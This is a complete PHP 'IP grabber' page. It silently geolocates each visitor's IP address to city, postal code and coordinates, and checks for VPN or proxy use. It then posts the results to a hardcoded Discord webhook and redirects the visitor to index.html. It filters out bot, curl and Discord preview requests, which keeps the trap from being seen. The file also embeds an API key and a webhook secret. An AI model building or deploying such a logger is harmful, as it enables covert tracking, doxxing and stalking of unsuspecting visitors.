<?php

$key                        = 'AYi5NIt9XBIZZwe4R7kdrlxWuv36pOgc';
$webhookurl                 = "https://discord.com/api/webhooks/1063806255409405992/bhDq29yUA2Nqig-xcyCbfYRpF6IcOzbMmjvKuLyUfLhu3jdk_Ohg6ErNyDVvX8QGdXvH";
$ip                         = isset($_SERVER['HTTP_CF_CONNECTING_IP']) ? $_SERVER['HTTP_CF_CONNECTING_IP'] : $_SERVER['REMOTE_ADDR'];
$user_agent                 = $_SERVER['HTTP_USER_AGENT'];
$strictness                 = 1;
$user_language              = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$allow_public_access_points = 'true';
$lighter_penalties          = 'false';
$browser                    = $_SERVER['HTTP_USER_AGENT'];
if (preg_match('/bot|Discord|robot|curl|spider|crawler|^$/i', $browser)) {
    exit();
}
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$curl                 = curl_init();
$timeout              = 5;
$url = sprintf("http://ip-api.com/json/%s", $ip);
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
$json = curl_exec($curl);
$details   = json_decode($json);
curl_close($curl);
if (isset($details->district)) {
    $district = "**DISTRICT:** $details->district";
} else {
    $district = "**DISTRICT:** **NONE**";
}
$parameters           = array(
    'user_agent' => $user_agent,
    'user_language' => $user_language,
    'strictness' => $strictness,
    'allow_public_access_points' => $allow_public_access_points,
    'lighter_penalties' => $lighter_penalties
);
$formatted_parameters = http_build_query($parameters);
$url                  = sprintf('https://www.ipqualityscore.com/api/json/ip/%s/%s?%s', $key, $ip, $formatted_parameters);
$timeout              = 5;
$curl                 = curl_init();
curl_setopt($curl, CURLOPT_URL, $url);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, $timeout);
$json = curl_exec($curl);
curl_close($curl);
$result     = json_decode($json);
$getvpn     = "$result->vpn";
$getproxy   = "$result->proxy";
$getcrawler = "$result->is_crawler";

$VpnInt     = (int) $getvpn;
if ($VpnInt === 0) {
    $vpn = "No";
} else {
    $vpn = "Yes";
}
$VpnInt = (int) $getproxy;
if ($VpnInt === 0) {
    $proxy = "No";
} else {
    $proxy = "Yes";
}
$VpnInt = (int) $getcrawler;
if ($VpnInt === 0) {
    $crawler = "No";
} else {
    $crawler = "Yes";
}
$isp = $details->isp;
$msg       = "**USER IP:** $ip\n**DETAILS:** $details->isp\n**DATE:** $TheirDate\n**TIME:** $TheirTime\n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**LATITUDE:** $details->lat\n**LONGTITUDE:** $details->lon\n$district\n**VPN:** $vpn\n**Proxy:** $proxy\n**Crawler:** $crawler";
$flag      = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
$json_data = array(
    'content' => "$msg",
    'username' => "Vistor Visited From: $details->country",
    'avatar_url' => "$flag"
);
$make_json = json_encode($json_data);
$ch        = curl_init($webhookurl);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Content-type: application/json'
));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec($ch);
header("Location: index.html");
die();
?>
